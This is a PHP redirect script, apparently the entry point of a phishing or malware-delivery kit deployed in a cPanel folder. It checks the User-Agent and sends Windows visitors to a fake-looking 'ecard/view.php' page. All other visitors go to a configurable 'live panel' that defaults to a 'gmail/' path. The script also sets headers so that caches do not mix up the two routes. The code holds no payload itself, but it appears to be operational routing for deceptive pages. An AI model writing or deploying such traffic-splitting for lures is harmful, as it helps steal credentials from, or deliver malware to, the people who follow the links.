<?php
$settings = require_once __DIR__ . '/config.php';

/**
 * Build a deployment-safe target path.
 *
 * Relative configured paths stay inside the current cPanel folder. Paths
 * beginning with "/" remain domain-root paths.
 */
function buildTargetPath($basePath, $configuredPath) {
    $configuredPath = trim((string) $configuredPath);
    $configuredPath = str_replace(["\r", "\n", '\\'], ['', '', '/'], $configuredPath);

    if ($configuredPath !== '' && $configuredPath[0] === '/') {
        return '/' . ltrim($configuredPath, '/');
    }

    return $basePath . ltrim($configuredPath, '/');
}

$scriptName = str_replace('\\', '/', $_SERVER['SCRIPT_NAME'] ?? '/index.php');
$scriptDir = str_replace('\\', '/', dirname($scriptName));
$scriptDir = ($scriptDir === '/' || $scriptDir === '.') ? '' : '/' . trim($scriptDir, '/');
$basePath = $scriptDir . '/';

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$isWindows = stripos($userAgent, 'Windows') !== false;
$livePanelPath = $settings['live_panel_path'] ?? 'gmail/';
if (trim((string) $livePanelPath) === '') {
    $livePanelPath = 'gmail/';
}
$livePanelTarget = buildTargetPath($basePath, $livePanelPath);
$ecardTarget = $basePath . 'ecard/view.php';

// Prevent a proxy or browser cache from reusing a redirect selected for a
// different device type.
header('Cache-Control: private, no-store, max-age=0');
header('Pragma: no-cache');
header('Vary: User-Agent');
header('X-Content-Type-Options: nosniff');
header('Content-Length: 0');

header('Location: ' . ($isWindows ? $ecardTarget : $livePanelTarget), true, 302);
exit;
